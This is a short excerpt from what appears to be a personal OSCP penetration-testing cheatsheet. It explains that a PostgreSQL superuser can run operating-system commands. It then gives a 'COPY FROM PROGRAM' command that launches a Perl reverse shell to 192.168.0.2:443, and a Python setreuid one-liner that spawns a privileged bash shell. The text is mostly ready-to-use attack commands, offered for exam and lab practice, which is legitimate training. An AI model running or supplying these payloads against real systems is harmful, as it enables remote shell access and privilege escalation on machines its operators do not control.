...
title: Checklist
tags: [OSCP, checklist]
description: "Forked liodeus' OSCP personal cheatsheet"
---
...
This allows the database superuser, and any user in the ‘pg_execute_server_program’ group to run arbitrary operating system commands.
...
```
COPY cmd FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.2:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
...
## Escape EUID
### forked from nobodyatall648's repo

1) Using SSH public key authentication technique to escape

2) Using python setreuid to escape
...
```
python -c 'import os;os.setreuid(0);os.system("/bin/bash -p")'
```
